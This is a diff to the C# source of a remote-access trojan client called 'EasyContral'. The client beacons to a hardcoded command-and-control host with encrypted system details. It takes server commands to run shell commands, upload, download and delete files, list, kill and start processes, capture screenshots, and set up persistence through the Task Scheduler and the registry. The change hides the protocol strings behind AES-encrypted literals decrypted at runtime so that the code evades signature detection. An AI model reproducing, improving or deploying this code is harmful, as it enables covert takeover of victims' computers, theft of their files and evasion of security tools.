@@ -15,8 +15,8 @@ namespace EasyContral
     internal class Program
     {
         static string Server_Ip = "cloud.foreverhome.live";// Server端地址
-        static string Key = "jV5lO66M/CmXk3OP067sLbgfYTAanFcAT8oOhSzUYtw=";
-        static string IV = "rNQez1Kfq8OqujG5EuyrVA==";
+        static public string Key = "jV5lO66M/CmXk3OP067sLbgfYTAanFcAT8oOhSzUYtw=";
+        static public string IV = "rNQez1Kfq8OqujG5EuyrVA==";
 
         static string ClientID = SystemInfo.GetClientID();
         static string CPUInfo = SystemInfo.GetCpuName();
@@ -44,14 +44,22 @@ namespace EasyContral
                     Dictionary<string, Dictionary<string, string>> DicMessage = new Dictionary<string, Dictionary<string, string>>();
                     Dictionary<string, string> State = new Dictionary<string, string>();
                     Dictionary<string, string> Data = new Dictionary<string, string>();
-                    State.Add("Type", "Connecting");
-                    State.Add("ClientID", ClientID);
-                    Data.Add("CPUInfo", CPUInfo);
-                    Data.Add("OSInfo", OSInfo);
-                    Data.Add("MemoryInfo", MemoryInfo);
-                    Data.Add("HostName", HostName);
-                    DicMessage.Add("State", State);
-                    DicMessage.Add("Data", Data);
+                    //State.Add("Type", "Connecting");
+                    State.Add(AESDecrypt("0xAu5UiRiZnoXm+bJodmQg==", Key, IV), AESDecrypt("OqYQ3RtTKfVCu++DfKYx4Q==", Key, IV));
+                    //State.Add("ClientID", ClientID);
+                    State.Add(AESDecrypt("sLPOasNk+M6R5RamrIlOoA==", Key, IV), ClientID);
+                    //Data.Add("CPUInfo", CPUInfo);
+                    Data.Add(AESDecrypt("fR42XnBH1YSP/1UeSUe27Q==", Key, IV), CPUInfo);
+                    //Data.Add("OSInfo", OSInfo);
+                    Data.Add(AESDecrypt("GtSeAvriDjw9UP/FPWB+SQ==", Key, IV), OSInfo);
+                    //Data.Add("MemoryInfo", MemoryInfo);
+                    Data.Add(AESDecrypt("x3Hkt9kHTYUwmI36ryynrQ==", Key, IV), MemoryInfo);
+                    //Data.Add("HostName", HostName);
+                    Data.Add(AESDecrypt("aWE9zu/7O82b3atgVd6l2A==", Key, IV), HostName);
+                    //DicMessage.Add("State", State);
+                    DicMessage.Add(AESDecrypt("MeQNthYfPvz5oru24Vr0hQ==", Key, IV), State);
+                    //DicMessage.Add("Data", Data);
+                    DicMessage.Add(AESDecrypt("wHmhVCjw4b+gUiVQSaHM3w==", Key, IV), Data);
                     string JsonMessage = DicToJson(DicMessage);
                     JsonMessage = AESEncrypt(JsonMessage, Key, IV);
                     var content = new StringContent(JsonMessage, Encoding.UTF8, "application/json");
@@ -63,65 +71,81 @@ namespace EasyContral
                     DicMessage.Clear();
                     State.Clear();
                     Data.Clear();
-                    string Type = result["State"]["Type"];
-                    string Command = result["Data"]["ServerMessage"];
+                    //string Type = result["State"]["Type"];
+                    string Type = result[AESDecrypt("MeQNthYfPvz5oru24Vr0hQ==", Key, IV)][AESDecrypt("0xAu5UiRiZnoXm+bJodmQg==", Key, IV)];
+                    //string Command = result["Data"]["ServerMessage"];
+                    string Command = result[AESDecrypt("wHmhVCjw4b+gUiVQSaHM3w==", Key, IV)][AESDecrypt("YfckT1CDHddRjspyK/+G7A==", Key, IV)];
                     switch (Type)
                     {
                         case "CMD":
                             string output = GeneralContral.Shell(Command);
-                            SendToServer(result, output, "CMDResult");
+                            //SendToServer(result, output, "CMDResult");
+                            SendToServer(result, output, AESDecrypt("la/g01byyTkNvvbd8KCOmw==", Key, IV));
                             break;
                         case "Drives":
-                            SendToServer(result, Drive, "DirResult");
+                            //SendToServer(result, Drive, "DirResult");
+                            SendToServer(result, Drive, AESDecrypt("U9ImpoXkig2Ym3GuDa1umw==", Key, IV));
                             break;
                         case "Files":
                             string files = FileContral.GetFileList(Command);
-                            SendToServer(result, files, "FilesResult");
+                            //SendToServer(result, files, "FilesResult");
+                            SendToServer(result, files, AESDecrypt("ZxFxSeeIg6vzRpV18NdzyQ==", Key, IV));
                             break;
                         case "File_Upload":
-                            string file = result["Data"]["FileData"];
+                            //string file = result["Data"]["FileData"];
+                            string file = result[AESDecrypt("wHmhVCjw4b+gUiVQSaHM3w==", Key, IV)][AESDecrypt("iKbImWYMAqPazPQ7cW5flw==", Key, IV)];
                             FileContral.UploadFile(Command, file);
-                            SendToServer(result, "OK", "File_UploadResult");
+                            //SendToServer(result, "OK", "File_UploadResult");
+                            SendToServer(result, "OK", AESDecrypt("Tw3iR732+O93AxseWpqih/dU7Guy9ODN7i0k7HcnZzs=", Key, IV));
                             break;
                         case "File_Download":
                             string FileName = Path.GetFileName(Command);
                             string FileTxt = FileContral.DownloadFile(Command);
-                            SendToServer(result, FileName + "?" + FileTxt, "File_DownloadResult");
+                            //SendToServer(result, FileName + "?" + FileTxt, "File_DownloadResult");
+                            SendToServer(result, FileName + "?" + FileTxt, AESDecrypt("LWQfIWiuWfMziTMJmzzxYrj/Z5caJ9qA+u2MFK1Yu24=", Key, IV));
                             break;
                         case "File_ReName":
                             string NewName = Command.Split('?')[0];
                             string OldName = Command.Split('?')[1];
                             FileContral.RenameFile(OldName, NewName);
-                            SendToServer(result, "OK", "File_ReNameResult");
+                            //SendToServer(result, "OK", "File_ReNameResult");
+                            SendToServer(result, "OK", AESDecrypt("LkDO63SM3HLSNUx+hiLfLEPj8rYMG5bnTSFZCT8ZgXw=", Key, IV));
                             break;
                         case "File_Delete":
                             FileContral.DeleteFile(Command);
-                            SendToServer(result, "OK", "File_DeleteResult");
+                            //SendToServer(result, "OK", "File_DeleteResult");
+                            SendToServer(result, "OK", AESDecrypt("56mVF/XGQSQpNPi4lEOX2WGydijsmLtG6FzXEhFrf+s=", Key, IV));
                             break;
                         case "GetProcess":
                             Dictionary<string, Dictionary<string, string>> Processs = GeneralContral.AllProcess();
                             string Processs_ = JsonConvert.SerializeObject(Processs);
-                            SendToServer(result, Processs_, "GetProcessResult");
+                            //SendToServer(result, Processs_, "GetProcessResult");
+                            SendToServer(result, Processs_, AESDecrypt("1Ur9IeFhne8Gz79ZZ1Qdb8PL42GiuUC88IsO5VOmQsk=", Key, IV));
                             break;
                         case "KillProcess":
                             GeneralContral.KillProcess(Command);
-                            SendToServer(result, "OK", "KillProcessResult");
+                            //SendToServer(result, "OK", "KillProcessResult");
+                            SendToServer(result, "OK", AESDecrypt("OuqBLEjUxP2YEStFJXl77zJcGeXsHmD0zGDiPdbG6QQ=", Key, IV));
                             break;
                         case "CreateProcess":
                             GeneralContral.StartProcess(Command);
-                            SendToServer(result, "OK", "StartProcessResult");
+                            //SendToServer(result, "OK", "StartProcessResult");
+                            SendToServer(result, "OK", AESDecrypt("9Pv2MhLbKggqvE0E9rpGTqMOYVo/Rkadgu3RiAVmgYw=", Key, IV));
                             break;
                         case "GetDesktop":
                             string base64img = GeneralContral.ScreenShot();
-                            SendToServer(result, base64img, "GetDesktopResult");
+                            //SendToServer(result, base64img, "GetDesktopResult");
+                            SendToServer(result, base64img, AESDecrypt("y3cBEXi88K2GrN5Gki3x8Xi88YdjXYkYCqIzFz2NXXY=", Key, IV));
                             break;
                         case "AutoRunTaskScheduler":
                             GeneralContral.AutoRun_TaskScheduler();
-                            SendToServer(result, "OK", "AutoRunTaskSchedulerResult");
+                            //SendToServer(result, "OK", "AutoRunTaskSchedulerResult");
+                            SendToServer(result, "OK", AESDecrypt("KT7lTMzBcTtwzeKfFqESIbKM4O8BsXI3xcmtywC0kIg=", Key, IV));
                             break;
                         case "AutoRunRegistry":
                             GeneralContral.AutoRun_Registry();
-                            SendToServer(result, "OK", "AutoRunRegistryResult");
+                            //SendToServer(result, "OK", "AutoRunRegistryResult");
+                            SendToServer(result, "OK", AESDecrypt("f0K33hL+D0BGnVKW8rtojt0VFBYtmae6+9W9QtWhlUI=", Key, IV));
                             break;
                         case "SetSleepTime":
                             WaitTime = int.Parse(Command) * 1000;
